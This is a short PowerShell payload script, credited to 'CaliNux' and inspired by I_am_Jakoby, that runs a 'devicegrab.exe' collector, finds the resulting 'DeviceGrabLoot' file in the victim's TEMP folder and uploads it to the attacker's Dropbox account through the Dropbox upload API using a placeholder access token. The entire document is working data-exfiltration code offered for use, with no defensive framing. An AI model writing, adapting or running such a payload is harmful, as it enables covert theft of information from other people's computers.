# Script created by CaliNux
# Inspired by I_am_Jakoby 
# Special thanks to I_am_Jakoby for their DropBox code
# Check out his youtube channel to become epic

# Run the devicegrab.py script
.\devicegrab.exe


# locate and upload file to dropbox
$DropBoxAccessToken = "YOUR DROPBOX TOKEN HERE"   # Replace with your DropBox Access Token
$targetFileName = Get-ChildItem -Path $env:TEMP -Filter "DeviceGrabLoot*.txt" | Select-Object -ExpandProperty Name
$sourceFilePath = Join-Path $env:TEMP -ChildPath $targetFileName

function DropBox-Upload {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory = $true, ValueFromPipeline = $true)]
        [Alias("f")]
        [string]$SourceFilePath
    )

    $outputFile = Split-Path $SourceFilePath -Leaf
    $targetFilePath = "/$outputFile"
    $arg = '{ "path": "' + $targetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
    $authorization = "Bearer " + $DropBoxAccessToken
    $headers = @{}
    $headers.Add("Authorization", $authorization)
    $headers.Add("Dropbox-API-Arg", $arg)
    $headers.Add("Content-Type", 'application/octet-stream')

    Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
}

DropBox-Upload -SourceFilePath $sourceFilePath
